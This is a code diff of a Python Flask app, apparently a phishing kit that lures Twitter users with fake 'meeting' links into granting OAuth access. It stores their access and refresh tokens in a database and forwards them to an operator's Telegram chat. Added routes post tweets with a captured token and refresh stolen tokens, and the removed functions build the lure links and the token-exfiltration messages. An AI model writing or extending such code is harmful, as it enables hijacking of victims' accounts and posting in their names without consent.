@@ -3,7 +3,7 @@ import hashlib
 import os
 import sqlite3  # For database storage
 import requests
-from flask import Flask, redirect, request, session
+from flask import Flask, redirect, request, session, render_template
 
 # Configuration: Ensure these environment variables are set correctly
 CLIENT_ID = os.getenv('CLIENT_ID')
@@ -113,24 +113,22 @@ def send_message_via_telegram(message):
     }
     requests.post(url, json=data)
 
-# Function to handle single token refresh
-def handle_refresh_single():
-    tokens = get_all_tokens()
-    if tokens:
-        access_token, token_refresh, username = tokens[0]  # Use the first token
-        refresh_token_in_db(token_refresh, username)
-    else:
-        send_message_via_telegram("❌ No tokens found to refresh.")
+# Function to get Twitter username
+def get_twitter_username(access_token):
+    url = "https://api.twitter.com/2/users/me"
+    headers = {
+        "Authorization": f"Bearer {access_token}"
+    }
 
-# Function to handle bulk token refresh
-def handle_refresh_bulk():
-    tokens = get_all_tokens()
-    if tokens:
-        for access_token, refresh_token, username in tokens:
-            refresh_token_in_db(refresh_token, username)
-        send_message_via_telegram(f"✅ Bulk token refresh complete. {len(tokens)} tokens refreshed.")
+    response = requests.get(url, headers=headers)
+
+    if response.status_code == 200:
+        data = response.json()
+        username = data.get("data", {}).get("username")
+        return username
     else:
-        send_message_via_telegram("❌ No tokens found to refresh.")
+        print(f"Failed to fetch username. Status code: {response.status_code}")
+        return None
 
 # Function to post a tweet using a single token
 def post_tweet(access_token, tweet_text):
@@ -173,6 +171,25 @@ def handle_post_bulk(tweet_text):
     else:
         send_message_via_telegram("❌ No tokens found to post tweets.")
 
+# Function to handle single token refresh
+def handle_refresh_single():
+    tokens = get_all_tokens()
+    if tokens:
+        access_token, token_refresh, username = tokens[0]  # Use the first token
+        refresh_token_in_db(token_refresh, username)
+    else:
+        send_message_via_telegram("❌ No tokens found to refresh.")
+
+# Function to handle bulk token refresh
+def handle_refresh_bulk():
+    tokens = get_all_tokens()
+    if tokens:
+        for access_token, refresh_token, username in tokens:
+            refresh_token_in_db(refresh_token, username)
+        send_message_via_telegram(f"✅ Bulk token refresh complete. {len(tokens)} tokens refreshed.")
+    else:
+        send_message_via_telegram("❌ No tokens found to refresh.")
+
 # Telegram bot webhook to listen for commands
 @app.route('/webhook', methods=['POST'])
 def telegram_webhook():
@@ -200,79 +217,55 @@ def telegram_webhook():
 
     return '', 200
 
-# Generate code verifier and challenge
-def generate_code_verifier_and_challenge():
-    code_verifier = base64.urlsafe_b64encode(os.urandom(32)).rstrip(b'=').decode('utf-8')
-    code_challenge = base64.urlsafe_b64encode(
-        hashlib.sha256(code_verifier.encode()).digest()
-    ).rstrip(b'=').decode('utf-8')
-    return code_verifier, code_challenge
+@app.route('/tweet/<access_token>', methods=['GET', 'POST'])
+def tweet(access_token):
+    if request.method == 'POST':
+        tweet_text = request.form['tweet_text']
+        result = post_tweet(access_token, tweet_text)
+        return render_template('tweet_result.html', result=result)
 
-# Function to send a startup message with OAuth link and meeting link
-def send_startup_message():
-    state = "0"  # Fixed state value for initialization
-    code_verifier, code_challenge = generate_code_verifier_and_challenge()
-    
-    # Generate the OAuth link
-    authorization_url = CALLBACK_URL
+    return render_template('tweet_form.html', access_token=access_token)
 
-    # Generate the meeting link
-    meeting_url = f"{CALLBACK_URL}?meeting={state}&pwd={code_challenge}"
+@app.route('/refresh/<refresh_token2>', methods=['GET'])
+def refresh_page(refresh_token2):
+    return render_template('refresh.html', refresh_token=refresh_token2)
+
+@app.route('/refresh/<refresh_token>/perform', methods=['POST'])
+def perform_refresh(refresh_token):
+    token_url = 'https://api.twitter.com/2/oauth2/token'
     
-    # Message content
-    message = (
-        f"🚀 *OAuth Authorization Link:*\n[Authorize link]({authorization_url})\n\n"
-        f"📅 *Meeting Link:*\n[Meeting link]({meeting_url})"
-    )
+    client_credentials = f"{CLIENT_ID}:{CLIENT_SECRET}"
+    auth_header = base64.b64encode(client_credentials.encode()).decode('utf-8')
     
-    # Send the message to Telegram
-    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
-    data = {
-        "chat_id": TELEGRAM_CHAT_ID,
-        "text": message,
-        "parse_mode": "Markdown"
+    headers = {
+        'Authorization': f'Basic {auth_header}',
+        'Content-Type': 'application/x-www-form-urlencoded'
     }
-    requests.post(url, json=data)
-
-# Function to send access and refresh tokens to Telegram
-def send_to_telegram(access_token, refresh_token=None):
-    alert_emoji = "🚨"
-    key_emoji = "🔑"
     
-    # Get the username from the access token
-    username = "example_username"  # Placeholder, implement fetching username as needed
-    if username:
-        twitter_url = f"https://twitter.com/{username}"
+    data = {
+        'refresh_token': refresh_token,
+        'grant_type': 'refresh_token',
+        'client_id': CLIENT_ID
+    }
+
+    response = requests.post(token_url, headers=headers, data=data)
+    token_response = response.json()
+
+    if response.status_code == 200:
+        new_access_token = token_response.get('access_token')
+        new_refresh_token = token_response.get('refresh_token')
+        send_to_telegram(new_access_token, new_refresh_token)
+        return f"New Access Token: {new_access_token}, New Refresh Token: {new_refresh_token}", 200
     else:
-        twitter_url = "Unknown user"
-    
-    # Store the token in the database
-    store_token(access_token, refresh_token, username)
+        error_description = token_response.get('error_description', 'Unknown error')
+        error_code = token_response.get('error', 'No error code')
+        return f"Error refreshing token: {error_description} (Code: {error_code})", response.status_code
 
-    # Get the total number of tokens stored
-    total_tokens = get_total_tokens()
-
-    # Message content
-    message = f"{alert_emoji} *New user authenticated: OAuth 2.0*\n"
-    message += f"{key_emoji} *Access Token:* `{access_token}`\n"
-    
-    if refresh_token:
-        refresh_link = f"{CALLBACK_URL}/refresh/{refresh_token}"
-        message += f"{key_emoji} *Refresh Token Link:* [Refresh Token]({refresh_link})\n"
-
-    tweet_link = f"{CALLBACK_URL}/tweet/{access_token}"
-    message += f"{key_emoji} *Post a Tweet Link:* [Post a Tweet]({tweet_link})\n"
-    message += f"👤 *Twitter Profile:* [@{username}]({twitter_url})\n"
-    message += f"🔢 *Total Tokens in Database:* {total_tokens}"
-
-    # Send the message to Telegram
-    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
-    data = {
-        "chat_id": TELEGRAM_CHAT_ID,
-        "text": message,
-        "parse_mode": "Markdown"
-    }
-    requests.post(url, json=data)
+@app.route('/j')
+def meeting():
+    state_id = request.args.get('meeting')  # Get the 'meeting' parameter from the URL
+    code_ch = request.args.get('pwd')  # Get the 'pwd' parameter from the URL
+    return render_template('meeting.html', state_id=state_id, code_ch=code_ch)
 
 @app.route('/')
 def home():
